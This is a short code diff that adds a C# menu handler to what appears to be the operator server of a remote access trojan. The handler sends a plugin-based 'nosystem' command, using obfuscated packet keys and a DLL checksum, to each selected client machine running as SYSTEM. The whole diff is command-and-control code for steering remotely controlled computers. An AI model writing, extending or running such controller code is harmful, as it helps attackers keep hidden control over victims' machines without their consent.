@@ -2253,5 +2253,32 @@ namespace Server
                 return;
             }
         }
+
+        private void noSystemToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack packet = new MsgPack();
+                packet.ForcePathObject("Pac_ket").AsString = "nosystem";
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                foreach (Clients client in GetSelectedClients())
+                {
+                    if (client.LV.SubItems[lv_user.Index].Text.ToLower() == "system")
+                    {
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
     }
 }
